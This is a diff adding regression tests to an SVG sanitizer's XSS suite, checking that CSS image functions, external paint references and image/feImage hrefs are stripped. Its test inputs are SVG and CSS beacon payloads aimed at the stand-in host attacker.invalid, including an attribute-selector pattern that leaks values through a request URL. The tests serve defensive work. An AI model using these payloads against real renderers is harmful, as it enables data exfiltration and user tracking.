@@ -971,6 +971,34 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<style>.arrow{fill:url(#grad1);marker-end:url(#mark)}</style><rect class="arrow"/>');
     return /<style/i.test(out) && /url\(#grad1\)/.test(out) && /url\(#mark\)/.test(out);
   }},
+  // v12.59 — string-source CSS image functions (no url() token) auto-fetch on
+  // render. image-set/image/cross-fade/src were the residual bypass of the
+  // v12.53 url()-only filter. Vela decks load NOTHING external.
+  { name: "SVG <style> image-set() string source removed (beacon blocked)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>[x^="V"]{background:image-set("https://attacker.invalid/b?p=V" 1x)}</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> -webkit-image-set / cross-fade / src() removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>a{background:-webkit-image-set("https://attacker.invalid/x" 1x)}b{x:cross-fade(url(#a),"https://attacker.invalid/y",50%)}c{x:src("https://attacker.invalid/z")}</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG fill='url(https://…)' presentation attr removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
+    const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG <feImage href> external removed (Roundcube class)", fn: async () => {
+    const out = sanitizeSvgMarkup('<filter><feImage href="https://attacker.invalid/b.png"/><feImage xlink:href="https://attacker.invalid/c.png"/></filter>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG #fragment paint refs + <a> https click-link preserved (v12.59)", fn: async () => {
+    const refs = sanitizeSvgMarkup('<rect fill="url(#grad)" clip-path="url(#c)"/>');
+    const link = sanitizeSvgMarkup('<a href="https://example.com/x"><text>hi</text></a>');
+    return /url\(#grad\)/.test(refs) && /url\(#c\)/.test(refs) && /href="https:\/\/example\.com\/x"/.test(link);
+  }},
   { name: "SVG <link rel=stylesheet> stripped outright", fn: async () => {
     const out = sanitizeSvgMarkup('<link rel="stylesheet" href="https://attacker.invalid/x.css"/><rect/>');
     return !/<link/i.test(out) && !/attacker\.invalid/i.test(out);
